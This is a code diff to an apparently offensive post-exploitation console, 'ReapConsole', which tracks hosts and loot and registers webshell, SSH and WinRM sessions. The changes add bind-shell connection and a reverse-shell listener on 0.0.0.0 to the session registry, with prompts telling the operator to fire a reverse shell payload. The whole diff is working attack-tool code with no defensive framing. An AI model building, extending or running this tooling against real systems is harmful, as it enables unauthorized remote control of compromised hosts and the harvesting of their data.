@@ -16,7 +16,7 @@ from .modules import all_modules, select
 from .patterns import proto_for_port
 from .reporter import Reporter
 from .store import LootStore
-from .transport import ADAPTERS, NotSupported
+from .transport import ADAPTERS, NotSupported, RawShellSession
 
 # Protocols worth auto-forwarding / registering for correlation when found on loopback.
 _FWD_CORR_PROTOS = {"ssh", "winrm", "smb", "mysql", "postgres", "mongodb",
@@ -78,7 +78,10 @@ class ReapConsole(cmd.Cmd):
 
     # -- register --------------------------------------------------------------
     def do_register(self, line):
-        """register <ssh|winrm|handoff|webshell> <host|url> [user] [password] [--key PATH] [--key-pass P] [--port N] [--ssl]"""
+        """register <ssh|winrm|handoff|webshell|bind|listen> <host|url|port> [user] [password] [--key PATH] [--key-pass P] [--port N] [--ssl] [--param NAME] [--method GET|POST] [--shell sh|cmd]
+
+        bind <host> <port>   — connect out to a bind shell
+        listen <port>        — catch a reverse shell (fire your payload after this)"""
         try:
             args = shlex.split(line)
         except ValueError as exc:
@@ -122,6 +125,31 @@ class ReapConsole(cmd.Cmd):
             sess = cls(url=pos[0], param=flags.get("param", "cmd"),
                        method=flags.get("method", "POST"),
                        shell=flags.get("shell", "sh"))
+            self.sessions[sess.session_id] = sess
+            self.active = sess.session_id
+            self.store.get_or_create_host(sess.host)
+            self.console.print(f"[green]registered[/] {sess.session_id} (active)")
+            self._fingerprint(sess.session_id)
+            return
+        if adapter in ("bind", "listen"):
+            shell = flags.get("shell", "sh")
+            try:
+                if adapter == "bind":
+                    if len(pos) < 2:
+                        self.console.print("usage: register bind <host> <port> [--shell sh|cmd]")
+                        return
+                    sess = RawShellSession(pos[0], int(pos[1]), mode="connect", shell=shell)
+                else:  # listen — block on accept until the reverse shell connects
+                    if not pos:
+                        self.console.print("usage: register listen <port> [--shell sh|cmd]")
+                        return
+                    port = int(pos[0])
+                    self.console.print(f"[cyan]listening on 0.0.0.0:{port}[/] — fire your reverse "
+                                       f"shell now (Ctrl-C to abort)...")
+                    sess = RawShellSession(port=port, mode="listen", shell=shell)
+            except (Exception, KeyboardInterrupt) as exc:
+                self.console.print(f"[red]catch failed: {exc}[/]")
+                return
             self.sessions[sess.session_id] = sess
             self.active = sess.session_id
             self.store.get_or_create_host(sess.host)
